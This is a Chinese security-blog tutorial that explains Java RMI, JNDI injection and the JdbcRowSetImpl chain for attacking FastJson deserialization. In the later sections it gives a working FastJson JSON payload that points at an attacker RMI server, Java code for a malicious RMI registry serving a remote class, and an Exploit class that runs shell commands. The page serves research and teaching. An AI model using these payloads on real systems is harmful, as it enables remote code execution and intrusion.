<!doctype html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">
<title>深入理解JNDI注入与Java反序列化漏洞利用 &#8211; KINGX</title>
<meta name="description" content="Exploit Java Deserialization with RMI">
<meta name="keywords" content="Vulnerability, Java">

<!-- Twitter Cards -->
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kingx.me/images/">
<meta name="twitter:title" content="深入理解JNDI注入与Java反序列化漏洞利用">
<meta name="twitter:description" content="Exploit Java Deserialization with RMI">
<meta name="twitter:creator" content="@https://example.com">

<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="深入理解JNDI注入与Java反序列化漏洞利用">
<meta property="og:description" content="Exploit Java Deserialization with RMI">
<meta property="og:url" content="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">
<meta property="og:site_name" content="KINGX">





<link rel="canonical" href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">
<link href="https://kingx.me/feed.xml" type="application/atom+xml" rel="alternate" title="KINGX Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- For all browsers -->
<link rel="stylesheet" href="https://kingx.me/assets/css/main.css">
<!-- Webfonts -->
<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">

<meta http-equiv="cleartype" content="on">

<!-- Load Modernizr -->
<script src="https://kingx.me/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>

<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="https://kingx.me/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="https://kingx.me/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="https://kingx.me/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://kingx.me/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://kingx.me/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://kingx.me/images/apple-touch-icon-144x144-precomposed.png">




<style type="text/css">body {background-image:url(https://kingx.me/images/triangular.png);}</style>


</head>

<body id="post" >

<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
	<button class="dl-trigger">Open Menu</button>
	<ul class="dl-menu">
		<li><a href="https://kingx.me/">Home</a></li>
		<li>
			<a href="#">About</a>
			<ul class="dl-submenu">
				<li>
					<img src="https://kingx.me/images/avatar.jpg" alt="KINGX photo" class="author-photo">
					<h4>KINGX</h4>
					<p>What is Security</p>
				</li>
				<li><a href="https://kingx.me/about/"><span class="btn btn-inverse">Learn More</span></a></li>
				<li>
					<a href="mailto:root#kingx.me"><i class="fa fa-fw fa-envelope"></i> Email</a>
				</li>
				<li>
					<a href="https://example.com"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
				</li>
				<li>
					<a href="http://example.com"><i class="fa fa-fw fa-weibo"></i> Weibo</a>
				</li>
				
				
				
				<li>
					<a href="https://example.com"><i class="fa fa-fw fa-github"></i> GitHub</a>
				</li>
				
				
				
				
			</ul><!-- /.dl-submenu -->
		</li>
		<!-- <li>
			<a href="#">Posts</a>
			<ul class="dl-submenu">
				<li><a href="https://kingx.me/posts/">All Posts</a></li>
				<li><a href="https://kingx.me/tags/">All Tags</a></li>
			</ul>
		</li> -->
		
	    
	    <li><a href="https://kingx.me/latest-events/" >Security Incidents</a></li>
	  
	    
	    <li><a href="https://kingx.me/latest-vulns/" >Vulnerabilities</a></li>
	  
	    
	    <li><a href="https://kingx.me/pentest-tools/" >Red Team</a></li>
	  
	    
	    <li><a href="https://kingx.me/stop-learning/" >Stop Learning</a></li>
	  
	    
	    <li><a href="https://kingx.me/posts/" >Archives</a></li>
	  
	    
	    <li><a href="https://kingx.me/tags/" >Tags</a></li>
	  
	    
	    <li><a href="https://kingx.me/links/" >Links</a></li>
	  
	    
	    <li><a href="https://kingx.me/feed.xml" >RSS</a></li>
	  
	</ul><!-- /.dl-menu -->
</nav><!-- /.dl-menuwrapper -->




<div id="main" role="main">
  <article class="hentry">
    <header class="header-title">
      <div class="header-title-wrap">
        
          <h1 class="entry-title"><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" rel="bookmark" title="深入理解JNDI注入与Java反序列化漏洞利用">深入理解JNDI注入与Java反序列化漏洞利用</a></h1>
        
        <h2><span class="entry-date date published"><time datetime="2018-08-10T00:00:00-04:00">August 10, 2018</time></span></h2>
        
        <p class="entry-reading-time">
          <i class="fa fa-clock-o"></i>
          
Reading time ~2 minutes
          
          <span id="busuanzi_container_page_pv">
             / Page View <span id="busuanzi_value_page_pv">0</span> / Site Visitor <span id="busuanzi_value_site_uv">0</span>
          </span>
          
        </p><!-- /.entry-reading-time -->
        

      </div><!-- /.header-title-wrap -->
    </header>
    <div class="entry-content">
      <span class="entry-tags" style="color:red;font-size:13px;margin-bottom: 0px;">「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」</span>
      <h1 id="0-前言">0. 前言</h1>

<p>在Java反序列化漏洞挖掘或利用的时候经常会遇到RMI、JNDI、JRMP这些概念，其中RMI是一个基于序列化的Java远程方法调用机制。作为一个常见的反序列化入口，它和反序列化漏洞有着千丝万缕的联系。除了直接攻击RMI服务接口外（比如：CVE-2017-3241），我们在构造反序列化漏洞利用时也可以结合RMI方便的实现远程代码执行。</p>

<p>在2016年的BlackHat上，@pwntester分享了通过JNDI注入进行RCE利用的方法。这一利用方式在2016年的spring-tx.jar反序列化漏洞和2017年FastJson反序列化漏洞利用等多个场景中均有出现。</p>

<p>本文争取简单易懂的介绍一下RMI机制和JNDI注入利用方式，并且以JdbcRowSetImpl利用链和FastJson反序列化漏洞为例，记录真实的远程利用过程中可能遇到的问题和解决，希望能给研究这块的新同学一些参考，如有错误欢迎交流指正。</p>

<h1 id="1-关于rmi">1. 关于RMI</h1>

<p>这一节主要介绍一下RMI的调用流程、RMI注册表以及动态加载类的概念。</p>

<h2 id="11-远程方法调用">1.1 远程方法调用</h2>

<p>远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如：CORBA、WebService，这两种都是独立于编程语言的。而RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。</p>

<h2 id="12-远程对象">1.2 远程对象</h2>

<p>使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。</p>

<p>任何可以被远程调用方法的对象必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。如下：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloImpl</span> <span class="kd">implements</span> <span class="n">IHello</span> <span class="o">{</span>
    <span class="kd">protected</span> <span class="nf">HelloImpl</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
        <span class="n">UnicastRemoteObject</span><span class="o">.</span><span class="na">exportObject</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">sayHello</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p><em>注: IHello是客户端和服务端共用的接口（客户端本地必须有远程对象的接口，不然无法指定要调用的方法，而且其全限定名必须与服务器上的对象完全相同），HelloImpl是一个服务端远程对象，提供了一个sayHello方法供远程调用。它没有继承UnicastRemoteObject类或者实现java.rmi.Remote接口，而是在构造方法中调用了UnicastRemoteObject.exportObject()。</em></p>

<p>在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的：</p>

<p><img src="https://kingx.me/images/articles/rmi/Post-RMI-Invoke.png" alt="RMI远程调用" /></p>

<p>从逻辑上来看，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。</p>

<ol>
  <li>Server端监听一个端口，这个端口是JVM随机选择的；</li>
  <li>Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；</li>
  <li>Client端可以调用Stub上的方法；</li>
  <li>Stub连接到Server端监听的通信端口并提交参数；</li>
  <li>远程Server端上执行具体的方法，并返回结果给Stub；</li>
  <li>Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；</li>
</ol>

<p>那怎么获取Stub呢？</p>

<h2 id="13-rmi注册表">1.3 RMI注册表</h2>

<p>Stub的获取方式有很多，常见的方法是调用某个远程服务上的方法，向远程服务获取存根。但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。</p>

<p>要注册远程对象，需要RMI URL和一个远程对象的引用。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IHello</span> <span class="n">rhello</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HelloImpl</span><span class="o">();</span>
<span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
<span class="n">Naming</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"rmi://0.0.0.0:1099/hello"</span><span class="o">,</span> <span class="n">rhello</span><span class="o">);</span>
</code></pre></div></div>

<p>LocateRegistry.getRegistry()会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">"kingx_kali_host"</span><span class="o">,</span><span class="mi">1099</span><span class="o">);</span>
<span class="n">IHello</span> <span class="n">rhello</span> <span class="o">=</span> <span class="o">(</span><span class="n">IHello</span><span class="o">)</span> <span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"hello"</span><span class="o">);</span>
<span class="n">rhello</span><span class="o">.</span><span class="na">sayHello</span><span class="o">(</span><span class="s">"test"</span><span class="o">);</span>
</code></pre></div></div>

<p>使用RMI Registry之后，RMI的调用关系是这样的：</p>

<p><img src="https://kingx.me/images/articles/rmi/Post-RMI-Registry.png" alt="RMI注册表" /></p>

<p>所以其实从客户端角度看，服务端应用是有两个端口的，一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）。这个通信细节比较重要，真实利用过程中可能会在这里遇到一些坑。</p>

<h2 id="14-动态加载类">1.4 动态加载类</h2>

<p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p>

<p>这个概念比较重要，JNDI注入的利用方法中也借助了动态加载类的思路。</p>

<p>这里涉及到的角色：客户端、RMI注册表、远程对象服务器、托管class文件的Web服务器可以分别位于不同的主机上：</p>

<p><img src="https://kingx.me/images/articles/rmi/Post-RMI-Dynamic.png" alt="动态加载类" /></p>

<h1 id="2-jndi注入和jdbcrowsetimpl利用链">2. JNDI注入和JdbcRowSetImpl利用链</h1>

<h2 id="21-关于jndi">2.1 关于JNDI</h2>

<p>简单来说，JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>

<p>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p>

<p><img src="https://kingx.me/images/articles/rmi/jndi-arch.png" alt="JNDI架构" /></p>

<p>JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Hashtable</span> <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
<span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="o">);</span>
<span class="c1">//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factory</span>
<span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">PROVIDER_URL</span><span class="o">,</span> <span class="s">"rmi://kingx_kali:8080"</span><span class="o">);</span>
<span class="n">Context</span> <span class="n">ctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>
<span class="n">Object</span> <span class="n">local_obj</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"rmi://kingx_kali:8080/test"</span><span class="o">);</span>
</code></pre></div></div>

<p><em>注：InitialContext 是一个实现了 Context接口的类。使用这个类作为JNDI命名服务的入口点。创建InitialContext 对象需要传入一组属性，参数类型为java.util.Hashtable或其子类之一。</em></p>

<h2 id="22-利用jndi-references进行注入">2.2 利用JNDI References进行注入</h2>

<p>我们来到JNDI注入的核心部分，关于JNDI注入，@pwntester在BlackHat上的讲义中写的已经很详细。我们这里重点讲一下和RMI反序列化相关的部分。接触过JNDI注入的同学可能会疑问，不应该是RMI服务器最终执行远程方法吗，为什么目标服务器lookup()一个恶意的RMI服务地址，会被执行恶意代码呢？</p>

<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>

<p>整个利用流程如下：</p>

<ol>
  <li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
  <li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；</li>
  <li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
  <li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
  <li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li>
</ol>

<p>在这里，攻击目标扮演的相当于是JNDI客户端的角色，攻击者通过搭建一个恶意的RMI服务端来实施攻击。我们跟入lookup()函数的代码中，可以看到JNDI中对Reference类的处理逻辑，最终会调用NamingManager.getObjectInstance()：</p>

<p><img src="https://kingx.me/images/articles/rmi/reference-exploit.png" alt="Reference调用链" /></p>

<p>调用链：</p>

<ul>
  <li>-&gt; RegistryContext.decodeObject()</li>
  <li>-&gt; NamingManager.getObjectInstance()</li>
  <li>-&gt; factory.getObjectInstance()</li>
</ul>

<p><em>Tips：JNDI查找远程对象时InitialContext.lookup(URL)的参数URL可以覆盖一些上下文中的属性，比如：Context.PROVIDER_URL。</em></p>

<p>Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中就存在这个问题，当进行对象反序列化的时候，会执行lookup()操作，可以进行JNDI注入。</p>

<p>Matthias Kaiser(@matthias_kaiser)发现com.sun.rowset.JdbcRowSetImpl类的execute()也可以触发JNDI注入利用，调用过程如下：</p>

<ul>
  <li>-&gt; JdbcRowSetImpl.execute()</li>
  <li>-&gt; JdbcRowSetImpl.prepare()</li>
  <li>-&gt; JdbcRowSetImpl.connect()</li>
  <li>-&gt; InitialContext.lookup(dataSource)</li>
</ul>

<h2 id="23-fastjson反序列化利用">2.3 FastJson反序列化利用</h2>

<p>根据FastJson反序列化漏洞原理，FastJson将JSON字符串反序列化到指定的Java类时，会调用目标类的getter、setter等方法。</p>

<p>JdbcRowSetImpl类的setAutoCommit()会调用connect()函数，connect()函数如下：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">private</span> <span class="n">Connection</span> <span class="nf">connect</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
        <span class="k">if</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">conn</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">conn</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getDataSourceName</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">InitialContext</span> <span class="n">var1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
                <span class="n">DataSource</span> <span class="n">var2</span> <span class="o">=</span> <span class="o">(</span><span class="n">DataSource</span><span class="o">)</span><span class="n">var1</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getDataSourceName</span><span class="o">());</span>
                <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">getUsername</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="na">getUsername</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">)?</span><span class="n">var2</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getUsername</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">getPassword</span><span class="o">()):</span><span class="n">var2</span><span class="o">.</span><span class="na">getConnection</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">SQLException</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">resBundle</span><span class="o">.</span><span class="na">handleGetObject</span><span class="o">(</span><span class="s">"jdbcrowsetimpl.connect"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">getUrl</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">?</span><span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getUrl</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">getUsername</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">getPassword</span><span class="o">()):</span><span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>connect()会调用InitialContext.lookup(dataSourceName)，这里的参数dataSourceName是在setter方法setDataSourceName(String name)中设置的。所以在FastJson反序列化漏洞过程中，我们可以控制dataSourceName的值，也就是说满足了JNDI注入利用的条件。利用Payload如下：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://hacker_server/xxx","autoCommit":true}
</code></pre></div></div>

<p>攻击者的服务端需要启动一个RMI Registry，并且绑定一个Reference远程对象，同时设置一个恶意的factory类。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">remote_class_server</span> <span class="o">=</span> <span class="s">"http://192.168.1.200:8080/"</span><span class="o">;</span>
    <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">"Exploit"</span><span class="o">,</span> <span class="s">"Exploit"</span><span class="o">,</span> <span class="n">remote_class_server</span><span class="o">);</span>
    <span class="c1">//reference的factory class参数指向了一个外部Web服务的地址</span>
    <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
    <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"xxx"</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
</code></pre></div></div>

<p>同时启动一个WebServer提供Exploit.class下载。恶意代码可以放在构造方法中，也可以放在getObjectInstance(）方法中：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="kd">implements</span> <span class="n">ObjectFactory</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObjectInstance</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">Name</span> <span class="n">name</span><span class="o">,</span> <span class="n">Context</span> <span class="n">nameCtx</span><span class="o">,</span> <span class="n">Hashtable</span><span class="o">&lt;?,</span> <span class="o">?&gt;</span> <span class="n">environment</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">exec</span><span class="o">(</span><span class="s">"xterm"</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">exec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">sb</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
            <span class="n">BufferedInputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedInputStream</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">());</span>
            <span class="n">BufferedReader</span> <span class="n">inBr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">in</span><span class="o">));</span>
            <span class="n">String</span> <span class="n">lineStr</span><span class="o">;</span>
            <span class="k">while</span> <span class="o">((</span><span class="n">lineStr</span> <span class="o">=</span> <span class="n">inBr</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
                <span class="n">sb</span> <span class="o">+=</span> <span class="n">lineStr</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">;</span>
            <span class="n">inBr</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="k">return</span> <span class="n">sb</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="s">""</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<h1 id="3-远程利用faq">3. 远程利用FAQ</h1>

<p>网上很多PoC都是在本地测试的，然而在远程利用过程中可能会遇到一些坑，直接会导致利用失败，比如可能会遇到Timeout的错误。</p>

<h2 id="31-为什么远程利用会出现timeout">3.1 为什么远程利用会出现Timeout？</h2>

<p>使用JNDI注入Payload进行利用时，有时候发现目标确实反连到我们的RMI服务器了，却没有去下载WebServer上的恶意class文件。我们在局域网内使用Kali作为攻击者RMI服务器，复现一下攻击过程，往往会看到类似这样的Timeout的错误提示：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exception <span class="k">in </span>thread <span class="s2">"main"</span> javax.naming.ServiceUnavailableException <span class="o">[</span>Root exception is java.rmi.ConnectException: Connection refused to host: 127.0.1.1<span class="p">;</span> nested exception is: 
    java.net.ConnectException: Operation timed out]
    ...
    at fastjsonjndi.Victim.main<span class="o">(</span>Victim.java:23<span class="o">)</span>
Caused by: java.rmi.ConnectException: Connection refused to host: 127.0.1.1<span class="p">;</span> nested exception is: 
    java.net.ConnectException: Operation timed out
    at sun.rmi.transport.tcp.TCPEndpoint.newSocket<span class="o">(</span>TCPEndpoint.java:619<span class="o">)</span>
    ...
    at com.sun.jndi.rmi.registry.RegistryContext.decodeObject<span class="o">(</span>RegistryContext.java:462<span class="o">)</span>
    ... 4 more
Caused by: java.net.ConnectException: Operation timed out
    at java.net.PlainSocketImpl.socketConnect<span class="o">(</span>Native Method<span class="o">)</span>
    ...
    at sun.rmi.transport.tcp.TCPEndpoint.newSocket<span class="o">(</span>TCPEndpoint.java:613<span class="o">)</span>
    ... 9 more
</code></pre></div></div>

<p>为什么会超时呢？</p>

<p>其实如我们在第一小节所说，启动了RMI Registry的服务端有两个端口，一个是RMI Registry监听端口，另一个是远程对象的通信端口。而远程对象通信端口是系统随机分配的，远程对象的通信Host、Port等信息由RMI Registry传递给客户端，<strong>通信Host的默认值是服务端本地主机名对应的IP地址。</strong> <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/javarmiproperties.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/javarmiproperties.html</a></p>

<p>所以当服务器有多张网卡，或者/etc/hosts中将主机名指向某个内网IP的时候，RMI Registry默认传递给客户端的通信Host也就是这个内网IP地址，远程利用时自然无法建立通信。Kali默认的hosts文件如下：</p>

<p><img src="https://kingx.me/images/articles/rmi/kali-hosts.png" alt="KaliHosts" /></p>

<p>可以看到，默认情况下kali主机名是解析到 127.0.1.1 了。我们通过抓包可以还原这个通信细节：</p>

